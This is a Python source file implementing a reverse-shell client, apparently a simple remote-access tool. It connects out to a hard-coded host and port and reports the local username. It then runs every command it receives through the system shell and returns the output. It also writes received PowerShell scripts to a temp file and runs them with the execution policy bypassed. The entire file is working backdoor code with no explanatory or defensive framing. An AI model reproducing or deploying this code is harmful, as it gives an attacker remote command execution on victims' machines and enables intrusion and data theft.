import socket
import subprocess
import sys
import getpass
import os
import tempfile

def create_socket():
    try:
        global s
        s = socket.socket()
    except socket.error as e:
        sys.exit()

def connect_to_server():
    try:
        global s
        host = '127.0.0.1'
        port = 8081
        s.connect((host, port))
        username = getpass.getuser()
        s.send(username.encode())
    except socket.error as e:
        sys.exit()

def receive_commands():
    while True:
        try:
            data = s.recv(1024)
            if not data:
                break
            decoded_data = data.decode("utf-8")
            if decoded_data in ["EXIT", "q", "e", "quit"]:
                break
            elif decoded_data == "SCRIPT_START":
                script_lines = []
                while True:
                    line = s.recv(4096)
                    if not line:
                        break
                    script_line = line.decode()
                    script_lines.append(script_line)
                    if "SCRIPT_END" in script_line:
                        script_lines[-1] = script_lines[-1].replace("SCRIPT_END", "").strip()
                        break
                with tempfile.NamedTemporaryFile(delete=False, suffix=".ps1", mode="w", dir=os.getenv("TEMP")) as temp_script:
                    temp_script_name = temp_script.name
                    temp_script.writelines(script_lines)
                try:
                    subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", temp_script_name], check=True)
                    s.send(b"Script executed.")
                except subprocess.CalledProcessError as e:
                    s.send(f"Script execution failed: {str(e)}".encode())
                finally:
                    if os.path.exists(temp_script_name):
                        os.remove(temp_script_name)                        
            else:
                command = decoded_data
                cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output_bytes, error_bytes = cmd.communicate()
                output_str = output_bytes.decode("utf-8") + error_bytes.decode("utf-8")
                if output_str:
                    s.send(output_str.encode())
                else:
                    s.send(b"No output. The command may have opened an application.")
        except Exception as e:
            error_message = f"Error: {str(e)}"
            s.send(error_message.encode())
            break
    s.close()

def main():
    create_socket()
    connect_to_server()
    receive_commands()

if __name__ == "__main__":
    main()